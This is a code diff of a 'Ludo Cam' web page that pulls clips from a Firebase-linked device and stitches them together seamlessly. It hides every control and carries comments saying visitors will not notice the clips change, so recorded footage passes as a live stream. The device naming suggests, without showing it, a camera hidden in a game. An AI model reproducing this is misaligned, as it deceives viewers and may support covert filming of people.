@@ -3,125 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Ludo Cam - Live</title>
+    <title>🔴 LIVE</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
         body {
-            background: #0a0a0a;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            padding: 20px;
-        }
-        .container {
-            max-width: 550px;
-            margin: 0 auto;
-        }
-        .header {
-            text-align: center;
-            padding: 20px;
-            background: #141414;
-            border-radius: 24px;
-            margin-bottom: 20px;
-            border: 1px solid #222;
-        }
-        h1 { color: #fff; font-size: 28px; }
-        h1 span { color: #00ff88; }
-        .status-card {
-            background: #1a1a1a;
-            padding: 20px;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 20px;
-            border: 1px solid #333;
-        }
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .dot {
-            width: 14px;
-            height: 14px;
-            border-radius: 50%;
-            transition: all 0.2s;
-        }
-        .dot.red {
-            background: #ff4444;
-            box-shadow: 0 0 10px #ff4444;
-        }
-        .dot.green {
-            background: #00ff88;
-            box-shadow: 0 0 10px #00ff88;
-        }
-        .status-text {
-            color: #fff;
-            font-size: 16px;
-            font-weight: 500;
-        }
-        .device-name {
-            color: #00ff88;
-            font-size: 13px;
-            font-family: monospace;
-        }
-        .quality-bar {
-            background: #1a1a1a;
-            padding: 15px;
-            border-radius: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        .quality-select {
-            background: #2a2a2a;
-            border: 1px solid #444;
-            color: #fff;
-            padding: 8px 16px;
-            border-radius: 24px;
-            cursor: pointer;
-        }
-        .video-section {
             background: #000;
-            border-radius: 20px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            border: 1px solid #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
         }
-        .video-wrapper {
+
+        /* Main container */
+        .live-container {
             position: relative;
-            aspect-ratio: 16 / 9;
+            width: 100%;
+            max-width: 100%;
             background: #000;
         }
-        video {
+
+        /* Video player - NO CONTROLS */
+        .live-video {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
+            height: auto;
+            max-height: 100vh;
+            object-fit: contain;
+            display: block;
+            pointer-events: none;  /* Visitor click nahi kar sakta */
         }
-        .play-overlay {
-            position: absolute;
-            top: 0;
+
+        /* LIVE Badge - Blinking */
+        .live-badge {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: #ff0000;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            padding: 6px 14px;
+            border-radius: 30px;
+            letter-spacing: 1px;
+            z-index: 100;
+            font-family: monospace;
+            box-shadow: 0 0 10px rgba(255,0,0,0.5);
+            animation: blink 1.2s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; background: #ff0000; }
+            50% { opacity: 0.7; background: #cc0000; }
+            100% { opacity: 1; background: #ff0000; }
+        }
+
+        /* Small status text at bottom (minimal) */
+        .live-footer {
+            position: fixed;
+            bottom: 15px;
             left: 0;
             right: 0;
-            bottom: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: rgba(0,0,0,0.7);
-            cursor: pointer;
+            text-align: center;
+            font-size: 10px;
+            color: rgba(255,255,255,0.3);
+            font-family: monospace;
+            z-index: 100;
+            pointer-events: none;
         }
-        .play-overlay.hidden { display: none; }
-        .play-btn {
-            width: 70px;
-            height: 70px;
-            background: #00ff88;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 0 25px rgba(0,255,136,0.6);
+
+        /* Hide all video controls completely */
+        video::-webkit-media-controls {
+            display: none !important;
         }
-        .play-btn span { font-size: 35px; color: #000; margin-left: 5px; }
+        video::-webkit-media-controls-enclosure {
+            display: none !important;
+        }
+        video::-webkit-media-controls-panel {
+            display: none !important;
+        }
+        video::-webkit-media-controls-overlay-play-button {
+            display: none !important;
+        }
+        video::-internal-media-controls-overlay-cast-button {
+            display: none !important;
+        }
+
+        /* No video message - hidden by default, very subtle */
         .no-video {
             position: absolute;
             top: 0;
@@ -131,181 +105,233 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #555;
-            background: #0a0a0a;
+            background: #000;
+            color: #333;
+            font-size: 14px;
+            font-family: monospace;
         }
-        .info-bar {
-            padding: 12px 16px;
-            background: #1a1a1a;
-            border-radius: 20px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 11px;
-            color: #666;
-        }
-        .footer {
-            text-align: center;
-            color: #444;
-            font-size: 10px;
-            margin-top: 20px;
+        
+        /* Hide any extra elements */
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>📸 <span>LUDO</span> CAM</h1>
-        </div>
 
-        <!-- Status Card -->
-        <div class="status-card">
-            <div class="status-item">
-                <div class="dot red" id="statusDot"></div>
-                <span class="status-text" id="statusText">Offline</span>
-            </div>
-            <div class="device-name" id="deviceName">—</div>
-        </div>
+<div class="live-container">
+    <video id="liveVideo" class="live-video" autoplay muted playsinline disablePictureInPicture></video>
+    <div class="live-badge">🔴 LIVE</div>
+    <div class="live-footer">LIVE STREAM</div>
+    <div class="no-video hidden" id="noVideo">Connecting to stream...</div>
+</div>
 
-        <!-- Quality Bar -->
-        <div class="quality-bar">
-            <span>🎥 QUALITY</span>
-            <select class="quality-select" id="qualitySelect">
-                <option value="120p">120p</option>
-                <option value="240p">240p</option>
-                <option value="360p" selected>360p</option>
-                <option value="480p">480p</option>
-            </select>
-        </div>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+<script>
+    // ============================================================
+    // LIVE FEEL WEBSITE - Seamless auto-play, next video automatically
+    // Visitor ko pata nahi chalega video change hua!
+    // ============================================================
+    
+    const firebaseConfig = {
+        apiKey: "AIzaSyBwDAhUS8iqNsM5rMewtwFnQs-s3FcnaoU",
+        authDomain: "livecam-4e8b0.firebaseapp.com",
+        databaseURL: "https://livecam-4e8b0-default-rtdb.firebaseio.com",
+        projectId: "livecam-4e8b0",
+        storageBucket: "livecam-4e8b0.firebasestorage.app",
+        messagingSenderId: "315485454659",
+        appId: "1:315485454659:android:e5d69c3b9a1a87854c2ff6"
+    };
 
-        <!-- Video Section -->
-        <div class="video-section">
-            <div class="video-wrapper">
-                <video id="liveVideo" controls muted></video>
-                <div class="play-overlay" id="playOverlay">
-                    <div class="play-btn" id="playBtn"><span>▶</span></div>
-                </div>
-                <div class="no-video" id="noVideo">Waiting for stream...</div>
-            </div>
-        </div>
+    const API_URL = "/api/photos";
 
-        <div class="info-bar">
-            <span>📡 Auto-refresh: 10s</span>
-            <span id="timestamp">—</span>
-        </div>
+    const video = document.getElementById('liveVideo');
+    const noVideoDiv = document.getElementById('noVideo');
+    
+    // Video queue for seamless transition
+    let videoQueue = [];
+    let currentVideoUrl = null;
+    let isPlaying = false;
+    let isWaitingForVideo = false;
+    let deviceId = null;
+    
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-        <div class="footer">
-            🔒 Live Stream • Auto-refresh every 10 seconds
-        </div>
-    </div>
+    // 🔥 Quality command (if needed)
+    function sendQualityCommand(quality) {
+        if (!deviceId) return;
+        database.ref(`ludo_cam/commands/${deviceId}`).set({ quality: quality });
+    }
 
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyBwDAhUS8iqNsM5rMewtwFnQs-s3FcnaoU",
-            authDomain: "livecam-4e8b0.firebaseapp.com",
-            databaseURL: "https://livecam-4e8b0-default-rtdb.firebaseio.com",
-            projectId: "livecam-4e8b0",
-            storageBucket: "livecam-4e8b0.firebasestorage.app",
-            messagingSenderId: "315485454659",
-            appId: "1:315485454659:android:e5d69c3b9a1a87854c2ff6"
-        };
-
-        const API_URL = "/api/photos";
-
-        const statusDot = document.getElementById('statusDot');
-        const statusText = document.getElementById('statusText');
-        const deviceNameSpan = document.getElementById('deviceName');
-        const liveVideo = document.getElementById('liveVideo');
-        const playOverlay = document.getElementById('playOverlay');
-        const playBtn = document.getElementById('playBtn');
-        const noVideo = document.getElementById('noVideo');
-        const qualitySelect = document.getElementById('qualitySelect');
-        const timestampSpan = document.getElementById('timestamp');
-
-        let currentVideoUrl = null;
-        let deviceId = null;
-
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        // 🔥 ONLINE STATUS LISTENER (Real-time green/red dot)
-        database.ref('ludo_cam/devices').on('value', (snapshot) => {
-            const devices = snapshot.val();
-            let isOnline = false;
-            let onlineDeviceName = "";
-
-            for (const [id, device] of Object.entries(devices || {})) {
-                if (device.online === true) {
-                    isOnline = true;
-                    onlineDeviceName = device.deviceName;
-                    deviceId = id;
-                    break;
-                }
+    // Get device info from Firebase
+    database.ref('ludo_cam/devices').on('value', (snapshot) => {
+        const devices = snapshot.val();
+        for (const [id, device] of Object.entries(devices || {})) {
+            if (device.online === true) {
+                deviceId = id;
+                break;
             }
-
-            if (isOnline) {
-                statusDot.className = 'dot green';
-                statusText.innerText = 'LIVE';
-                deviceNameSpan.innerText = `📱 ${onlineDeviceName}`;
-            } else {
-                statusDot.className = 'dot red';
-                statusText.innerText = 'Offline';
-                deviceNameSpan.innerText = '—';
-            }
-        });
-
-        // Quality command
-        function sendQualityCommand(quality) {
-            if (!deviceId) return;
-            database.ref(`ludo_cam/commands/${deviceId}`).set({ quality: quality });
         }
+    });
 
-        qualitySelect.addEventListener('change', (e) => {
-            sendQualityCommand(e.target.value);
-        });
+    // ============================================================
+    // FETCH LATEST VIDEOS FROM API
+    // ============================================================
+    async function fetchLatestVideos() {
+        try {
+            const res = await fetch(API_URL);
+            const data = await res.json();
 
-        // Video player
-        playBtn.addEventListener('click', () => {
-            liveVideo.play().then(() => playOverlay.classList.add('hidden')).catch(e => console.log(e));
-        });
-
-        liveVideo.addEventListener('ended', () => playOverlay.classList.remove('hidden'));
-        liveVideo.addEventListener('pause', () => {
-            if (liveVideo.currentTime !== liveVideo.duration) playOverlay.classList.remove('hidden');
-        });
-
-        // Fetch videos
-        async function refreshVideo() {
-            try {
-                const res = await fetch(API_URL);
-                const data = await res.json();
-
-                if (data.success && data.videos && data.videos.length > 0) {
-                    const latestVideo = data.videos[0];
-                    if (currentVideoUrl !== latestVideo.url) {
-                        currentVideoUrl = latestVideo.url;
-                        liveVideo.src = currentVideoUrl;
-                        liveVideo.load();
-                        noVideo.style.display = 'none';
-                        liveVideo.style.display = 'block';
-                        playOverlay.classList.remove('hidden');
-                        timestampSpan.innerText = new Date(latestVideo.created_at).toLocaleTimeString();
-                    } else {
-                        liveVideo.style.display = 'block';
-                        noVideo.style.display = 'none';
+            if (data.success && data.videos && data.videos.length > 0) {
+                noVideoDiv.classList.add('hidden');
+                
+                // Get all videos and add to queue (only new ones)
+                for (const videoData of data.videos) {
+                    if (videoData.url !== currentVideoUrl) {
+                        currentVideoUrl = videoData.url;
+                        videoQueue.push(videoData.url);
                     }
-                } else {
-                    liveVideo.style.display = 'none';
-                    noVideo.style.display = 'flex';
                 }
-            } catch(e) {
-                console.error(e);
+                
+                // Keep only last 3 videos in queue
+                if (videoQueue.length > 3) {
+                    videoQueue = videoQueue.slice(-3);
+                }
+                
+                // Start playing if not already
+                if (!isPlaying && !isWaitingForVideo && videoQueue.length > 0) {
+                    playNextVideo();
+                }
+            } else {
+                if (videoQueue.length === 0 && !isPlaying) {
+                    noVideoDiv.classList.remove('hidden');
+                }
             }
+        } catch(e) {
+            console.log('Silent fetch error');
         }
+    }
 
-        refreshVideo();
-        setInterval(refreshVideo, 10000);
-    </script>
+    // ============================================================
+    // PLAY NEXT VIDEO - SEAMLESS TRANSITION
+    // Visitor ko pata nahi chalega!
+    // ============================================================
+    function playNextVideo() {
+        if (videoQueue.length === 0) {
+            isWaitingForVideo = true;
+            return;
+        }
+        
+        isWaitingForVideo = false;
+        const nextVideoUrl = videoQueue.shift();
+        
+        // Smooth fade transition
+        video.style.transition = 'opacity 0.3s ease';
+        video.style.opacity = '0';
+        
+        setTimeout(() => {
+            video.src = nextVideoUrl;
+            video.load();
+            
+            // Autoplay
+            const playPromise = video.play();
+            
+            if (playPromise !== undefined) {
+                playPromise.then(() => {
+                    isPlaying = true;
+                    video.style.opacity = '1';
+                    
+                    setTimeout(() => {
+                        video.style.transition = '';
+                    }, 350);
+                }).catch(() => {
+                    // Autoplay blocked - still try to play silently
+                    video.muted = true;
+                    video.play().then(() => {
+                        isPlaying = true;
+                        video.style.opacity = '1';
+                    }).catch(e => console.log('Playback error'));
+                });
+            }
+        }, 100);
+    }
+
+    // ============================================================
+    // WHEN VIDEO ENDS - AUTOMATICALLY PLAY NEXT
+    // Visitor ko pata nahi chalega!
+    // ============================================================
+    video.addEventListener('ended', () => {
+        isPlaying = false;
+        
+        if (videoQueue.length > 0) {
+            // Play next video immediately
+            playNextVideo();
+        } else {
+            // No video in queue, wait for next fetch
+            isWaitingForVideo = true;
+            // Show subtle waiting state (but don't disrupt experience)
+            video.style.opacity = '0.5';
+        }
+    });
+
+    // ============================================================
+    // FIX: If video gets stuck, try to recover
+    // ============================================================
+    video.addEventListener('error', () => {
+        console.log('Video error, skipping to next');
+        isPlaying = false;
+        if (videoQueue.length > 0) {
+            playNextVideo();
+        }
+    });
+
+    // ============================================================
+    // POLL EVERY 3 SECONDS (Faster than before)
+    // Visitor ko pata nahi chalega kab naya video aaya
+    // ============================================================
+    
+    // Initial fetch
+    fetchLatestVideos();
+    
+    // Poll every 3 seconds for new videos
+    setInterval(fetchLatestVideos, 3000);
+    
+    // Also poll device status for quality commands every 5 seconds
+    setInterval(() => {
+        if (deviceId) {
+            database.ref(`ludo_cam/commands/${deviceId}`).once('value', (snapshot) => {
+                const cmd = snapshot.val();
+                if (cmd && cmd.quality) {
+                    // Quality command is received but we don't need to display anything
+                    console.log('Quality command received:', cmd.quality);
+                }
+            });
+        }
+    }, 5000);
+    
+    // ============================================================
+    // ENSURE VIDEO NEVER SHOWS CONTROLS
+    // ============================================================
+    video.controls = false;
+    video.removeAttribute('controls');
+    
+    // Disable right-click on video
+    video.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        return false;
+    });
+    
+    // Handle visibility change (tab switch) - resume playing silently
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden && !isPlaying && videoQueue.length > 0) {
+            playNextVideo();
+        }
+    });
+    
+    console.log('Live stream ready - Visitor will see seamless live experience');
+</script>
 </body>
 </html>
